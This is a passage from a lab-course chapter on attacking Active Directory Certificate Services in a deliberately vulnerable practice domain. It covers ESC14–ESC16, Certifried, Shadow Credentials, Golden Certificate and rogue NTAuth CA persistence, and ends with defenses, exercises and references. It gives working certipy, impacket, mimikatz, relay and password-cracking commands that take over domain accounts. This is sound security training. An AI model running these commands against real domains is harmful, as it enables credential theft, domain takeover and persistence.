# shows the OID -> group link
```

Detection: enumerate `CN=OID,CN=Public Key Services,...` and look for
`msDS-OIDToGroupLink` attributes pointing at privileged groups.

---

## 6.18 (Mechanics) ESC14

`altSecurityIdentities` on a user account explicitly maps to an X.509
cert (subject, issuer, etc.). Weak mapping types or attacker-writable
attribute → spoof.

Example value:

```
X509:<I>DC=local,DC=corp,CN=CORP-CA<S>CN=Some Subject
```

If an attacker can write `altSecurityIdentities` on a target user, they
can configure the user's account to be authenticatable by any cert with
the named issuer + subject. Then enroll such a cert (which the attacker
controls subject of) and PKINIT.

Standalone niche but DVAD includes a vulnerable instance.

---

## 6.19 (Mechanics) ESC15 — "EKUwu"

Discovered in 2024 by Justin Bollinger. Schema v1 templates (legacy)
lack the modern szOID_NTDS_CA_SECURITY_EXT enforcement but were never
deprecated. Attackers can stuff additional EKUs via **application
policies** in the CSR (a quirk of v1 schema interpretation) to upgrade
a no-EKU cert to Client Auth.

CVE-2024-49019. Patched in November 2024 cumulative.

DVAD includes a v1 template `WebServer-v1` that does not have Client Auth
EKU but is enrollable by `Domain Users`. The exploit injects an
application-policy extension into the CSR with the Client Auth OID:

```bash
certipy req \
        -u peter.parker -p ... -ca CORP-CA -template WebServer-v1 \
        -application-policies '1.3.6.1.5.5.7.3.2'
# The CA misinterprets and issues with Client Auth in the EKU
```

---

## 6.20 (Mechanics) ESC16

CA-side: a registry knob `DisableExtensionList` includes the
`szOID_NTDS_CA_SECURITY_EXT` OID, telling the CA to omit the SID
extension server-side for **all** templates regardless of template flag.
Companion to ESC9 — instead of relying on per-template
`NO_SECURITY_EXTENSION`, the CA itself never emits it.

```
certutil -getreg policy\DisableExtensionList
```

If the list contains `1.3.6.1.4.1.311.25.2`, ESC16.

Exploit is identical to ESC9: enroll, change UPN, auth.

---

## 6.21 (Concept) Certifried — CVE-2022-26923

Default schema v2 templates set the subject from AD (`FROM_AD`) — derived
from the account's DN. If the account is a *computer* and you control its
`dNSHostName` attribute, you can:

1. Create `EVIL$` via MachineAccountQuota.
2. Set `EVIL$.dNSHostName = dc01.corp.local` (LDAP write).
3. Clear `EVIL$.servicePrincipalName` so the SPN conflict doesn't fail.
4. Request a cert with the default `Machine` template — the CA places
   `dc01.corp.local` in SAN-DNS.
5. PKINIT with the cert as `dc01$` — the KDC sees `dnsName=dc01.corp.local`
   in SAN, maps to `DC01$`, issues TGT.

```bash
certipy account create \
        -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 \
        -user 'EVIL$' -pass 'CertifiedPwn!1' \
        -dns dc01.corp.local

certipy req \
        -u 'EVIL$@corp.local' -p 'CertifiedPwn!1' \
        -ca CORP-CA -template Machine

certipy auth -pfx evil.pfx -dc-ip 10.10.0.10        # auths as dc01$
```

The patch (KB5014754) added the security extension to prevent this. With
strong binding mode 2, the cert must carry the *requesting* principal's
SID extension, not the spoofed DNS name's. DVAD intentionally disables
enforcement to keep the path live.

### Cleanup

Don't leave `EVIL$` polluting the directory:

```bash
impacket-addcomputer corp.local/peter.parker:'DVADlab2024!' \
        -delete -computer-name 'EVIL$' -dc-ip 10.10.0.10
```

Also reset `dc01$`'s dNSHostName if you nuked it accidentally
(`certipy account update -dns ...`).

---

## 6.22 (Mechanics) Shadow Credentials

A different vector. **`msDS-KeyCredentialLink`** is a multi-valued
attribute on user/computer objects that stores raw public keys for
Windows Hello / PKINIT. If you can write this attribute on a victim, you
can plant your public key, then PKINIT with the corresponding private
key.

```bash
certipy shadow auto \
        -u peter.parker@corp.local -p 'DVADlab2024!' \
        -account 'sql01$' -dc-ip 10.10.0.10
# certipy plants a key, PKINITs, retrieves sql01$'s NT hash, removes the key
```

This is `CRED-027` in DVAD.

### Why does the attribute even exist?

Windows Hello for Business (WHfB) needs a way to bind a user's biometric-
unlocked private key to their AD identity. `msDS-KeyCredentialLink` stores
the public component along with metadata (issuance time, device ID, key
type). The KDC, on PKINIT, accepts a cert/proof keyed by the public
component if `msDS-KeyCredentialLink` contains a matching entry.

### Who can write it

By default, the user themselves can. Computers can write their own. But
GenericWrite or GenericAll on the object gives any principal the ability
to plant a key. `certipy shadow auto` handles add → exploit → cleanup as
one command, leaving the attribute exactly as it was found.

### Manual flow

```bash
certipy shadow list -u peter.parker@corp.local -p ... -account sql01$
# show existing keys
certipy shadow add -u peter.parker -p ... -account sql01$
# add a new key, save the device ID
certipy shadow remove -u peter.parker -p ... -account sql01$ -device-id <uuid>
# remove just the one we added
```

`certipy shadow auto` chains add → auth → remove.

---

## 6.23 (Concept) Defenses (so you know why these are misconfigurations)

1. Templates: never enable `ENROLLEE_SUPPLIES_SUBJECT` for high-priv-
   issuing templates.
2. Restrict template enroll DACLs to specific groups. Audit periodically.
3. Require manager approval (`PEND_ALL_REQUESTS` flag) for sensitive
   templates.
4. Disable HTTP web enrollment, or require HTTPS + EPA.
5. Set `StrongCertificateBindingEnforcement = 2` (full enforcement).
6. Set `CertificateMappingMethods` to strong-only (`0x18`).
7. Disable `EDITF_ATTRIBUTESUBJECTALTNAME2`.
8. Remove unused legacy v1 schema templates.
9. Don't grant low-priv principals write rights on template/CA objects.
10. Enable cert audit logging (`Microsoft-Windows-CertificationAuthority/
    Operational`).
11. Set `MachineAccountQuota = 0` to neutralise Certifried + RBCD.
12. Patch CVE-2024-49019 (ESC15).
13. Restrict enrollment-agent on-behalf-of mappings.
14. Audit `msDS-KeyCredentialLink` for unexpected entries.
15. Audit `altSecurityIdentities` writes — should be empty for most
    accounts.

You'll restore these in defensive exercises (Chapter 13).

---

## 6.24 (Mechanics) Cert formats and conversions

You'll handle a lot of cert files. The format soup:

| Extension | Format | Contents |
|---|---|---|
| `.pem` | Base64 ASCII | Anything (cert, key, chain) — header lines tell you which |
| `.crt`, `.cer` | DER or PEM | Cert only |
| `.key` | PEM | Private key |
| `.csr` | PEM | Certificate Signing Request |
| `.p7b`, `.p7c` | PKCS#7 DER | Cert chain, no private key |
| `.pfx`, `.p12` | PKCS#12 binary | Cert + key + chain, password-protected |

Conversions you'll do constantly:

```bash
# PFX -> PEM key + cert
openssl pkcs12 -in evil.pfx -nocerts -nodes -out evil.key
openssl pkcs12 -in evil.pfx -nokeys -out evil.crt

# PEM key + cert -> PFX
openssl pkcs12 -export -in evil.crt -inkey evil.key -out evil.pfx \
        -password pass:hunter2

# View cert
openssl x509 -in evil.crt -text -noout
# View PFX
openssl pkcs12 -in evil.pfx -info -nodes

# Decode CSR
openssl req -in evil.csr -text -noout
```

certipy handles most of this automatically with `-pfx`, `-cert`, `-key`
flags.

### Cracking a PFX password

```
pfx2john evil.pfx > evil.john
john --wordlist=rockyou.txt evil.john
# or hashcat 27800
hashcat -m 27800 evil.john rockyou.txt
```

If you exfil a PFX with a weak password (common on dev/test boxes),
cracking is trivial.

---

## 6.25 (Concept) The CA-host attack path

ADCS chains through templates and AD are one vector. The **CA host
itself** is another:

- Compromise the CA host → read CA private key from CAPI/CNG keystore
  (DPAPI-protected; if the LSA secrets are available, decryptable).
- With the CA private key, sign certs **offline** without leaving CA
  audit logs (4886/4887). This is the "Golden Certificate" attack.
- The cert is then PKINIT-usable until the CA cert (its issuer) expires
  or is removed from NTAuth.

Mimikatz can do this:

```
mimikatz # crypto::capi
mimikatz # crypto::cng
mimikatz # crypto::certificates /systemstore:LOCAL_MACHINE /store:MY /export
# pulls cert bundles including CA's
```

For the CA's private key on a soft CA, the key lives in
`%ProgramData%\Microsoft\Crypto\Keys\` (or RSA\MachineKeys), protected by
the SYSTEM DPAPI master key — recoverable if you're SYSTEM on the host
or if you have the LSA secrets.

DVAD's CA does not protect the key with an HSM. SYSTEM on `ca01` = CA key
in your pocket = arbitrary cert forever.

---

## 6.26 (Concept) NTAuthCertificates — the second escalation

If you can **add a CA cert to `NTAuthCertificates`**, you've created a
parallel trusted CA. Your own self-signed "CA" suddenly issues certs that
PKINIT accepts.

Writing to `NTAuthCertificates` requires write on the
`CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=
Configuration,...` object. By default only Enterprise Admins have it. If
ESC5-style ACL bugs grant it elsewhere, you've unlocked persistence
across krbtgt rotations and password resets — the cert remains valid.

```
certutil -dspublish -f attacker_ca.crt NTAuthCA
```

Detection: 4662 on the NTAuthCertificates DN, or 5136 ds-object-modify.
**Audit this DN aggressively.** It is the highest-value object in the
forest, alongside the root domain's `nTSecurityDescriptor`.

---

## Lab exercises

### Exercise 6.A — Inventory templates

```bash
certipy find -u peter.parker@corp.local -p 'DVADlab2024!' \
        -dc-ip 10.10.0.10 -text -stdout | less
```

Identify which templates report `ESC1`, `ESC2`, ... `ESC16`. List them.
Note which are enrollable by `Domain Users`, which by specific groups.

### Exercise 6.B — Exploit ESC1

```bash
certipy req \
        -u svc_vision@corp.local -p 'Summer2023!' -dc-ip 10.10.0.10 \
        -ca CORP-CA -template ESC1Template \
        -upn Administrator@corp.local
certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
```

You receive Administrator's NT hash. Use it to DCSync krbtgt:

```bash
impacket-secretsdump \
        -hashes :<nt> -just-dc-user krbtgt \
        corp.local/Administrator@10.10.0.10
```

### Exercise 6.C — ESC8 (relay)

```bash
# Terminal A
ntlmrelayx.py \
        -t http://ca01.corp.local/certsrv/certfnsh.asp \
        --adcs --template DomainController -smb2support

# Terminal B
python3 PetitPotam.py \
        -d corp.local -u peter.parker -p 'DVADlab2024!' 10.10.0.1 10.10.0.10
```

Output: PKCS12 (base64) for `dc01$`. Then:

```bash
echo 'MIIK...' | base64 -d > dc01.pfx
certipy auth -pfx dc01.pfx -dc-ip 10.10.0.10
```

You'll see the `dc01$` NT hash + TGT.

### Exercise 6.D — Certifried

```bash
certipy account create \
        -u peter.parker@corp.local -p 'DVADlab2024!' \
        -dc-ip 10.10.0.10 \
        -user 'EVIL$' -pass 'CertifiedPwn!1' \
        -dns dc01.corp.local

certipy req \
        -u 'EVIL$@corp.local' -p 'CertifiedPwn!1' \
        -ca CORP-CA -template Machine

certipy auth -pfx evil.pfx -dc-ip 10.10.0.10
```

Cleanup the `EVIL$` computer after.

### Exercise 6.E — Shadow Credentials on `sql01$`

```bash
certipy shadow auto \
        -u peter.parker@corp.local -p 'DVADlab2024!' \
        -dc-ip 10.10.0.10 -account 'sql01$'
```

You receive `sql01$`'s NT hash. Use it for silver tickets or pass-the-hash
against sql01.

### Exercise 6.F — ESC4 template-DACL abuse

Find a template with WriteProperty granted to a non-privileged group:

```bash
certipy find -u peter.parker -p ... -vulnerable
# look for ESC4 findings
```

Use `certipy template -save-old` to flip the template to ESC1-like.
Enroll. Restore.

### Exercise 6.G — Parse a cert by hand

```bash
openssl x509 -in administrator.crt -text -noout
```

Identify:

- Serial number.
- Subject (probably `CN=svc_vision` because of FROM_AD).
- SAN — should include `Other Name: 1.3.6.1.4.1.311.20.2.3 =
  Administrator@corp.local`.
- EKU — Client Authentication.
- `szOID_NTDS_CA_SECURITY_EXT` extension — present or absent?

### Exercise 6.H — Crack a PFX password

If you exfil a `.pfx` with a guessable password (DVAD shares may seed one):

```bash
pfx2john weak.pfx > weak.john
john --wordlist=rockyou.txt weak.john
```

### Exercise 6.I — Plant a fake NTAuth CA (DA only)

As DA in DVAD, generate a self-signed CA cert and publish it:

```bash
openssl req -x509 -newkey rsa:2048 -days 365 -nodes \
        -subj '/CN=Attacker-Root' -keyout attacker.key \
        -out attacker.crt
certutil -dspublish -f attacker.crt NTAuthCA
```

Now any cert chaining to `attacker.crt` is accepted for PKINIT. Forge
client certs with `attacker.key` and PKINIT as any user. **Remove the
entry after** — this is persistence-tier and you should not leave it.

### Exercise 6.J — Test the fix matrix

For each ESC you exploited, apply the corresponding fix (chapter 13).
Re-run the exploit; verify failure. Roll back.

---

## Self-check questions

1. What's the difference between encrypting with a public key and signing
   with a private key?
2. What's in a CSR vs in a certificate?
3. Which EKU OIDs let a cert do client authentication?
4. What's `NTAuthCertificates` and why does it matter?
5. What's the difference between ESC1 and ESC6 at the policy-flag level?
6. Why is ESC8 fundamentally a relay vulnerability and not a template
   misconfiguration?
7. What's the difference between ESC9 and ESC10? Where does each live?
8. Why is `MachineAccountQuota=10` a precondition for Certifried?
9. What's a Shadow Credential and which attribute stores it?
10. What's the simplest single fix that mitigates ESC8?
11. Why does `StrongCertificateBindingEnforcement = 2` defeat ESC1 even
    when the template still has `ENROLLEE_SUPPLIES_SUBJECT`?
12. What does the `szOID_NTDS_CA_SECURITY_EXT` extension contain, and how
    is it used by the KDC?
13. What's the difference between a "Golden Certificate" attack and a
    standard ESC1 exploitation?
14. What's the difference between Client Authentication EKU and Smart
    Card Logon EKU for PKINIT purposes?
15. Why does ESC13 give you group membership without modifying any AD
    group object?
16. How does `certipy shadow auto` avoid leaving permanent artefacts on
    the victim account?
17. What's the role of `EDITF_ATTRIBUTESUBJECTALTNAME2` and where is it
    set?
18. What's an Enrollment Agent restriction, and how does it harden ESC3?

---

## References

- **SpecterOps — *Certified Pre-Owned*** (Will Schroeder, Lee Christensen):
  https://posts.specterops.io/certified-pre-owned-d95910965cd2 — read in
  full. The seminal paper that named ESC1–ESC8.
- **certipy** documentation: https://github.com/ly4k/Certipy
- **Microsoft KB5014754** — certificate-based authentication changes,
  enforcement timeline.
- **MS-WCCE** — Windows Client Certificate Enrollment Protocol.
- **MS-ICPR** — ICertRequest interface specifics.
- **Oliver Lyak / @ly4k** — blog posts on ESC9, ESC10, ESC11, ESC13,
  ESC16.
- **Will Schroeder & Lee Christensen — *Shadow Credentials*** post.
- **Tarlogic — *EKUwu (ESC15)*** writeup.
- **Justin Bollinger — *EKUwu* / CVE-2024-49019** advisory.
- **harmj0y — *Targeted Kerberoasting*** — relevant when combining ACL
  abuse with cert-based attacks on service accounts.
- **TrustedSec — *Operationalizing ADCS*** — practical operator notes.

Next: [07-attacker-toolkit.md](07-attacker-toolkit.md).
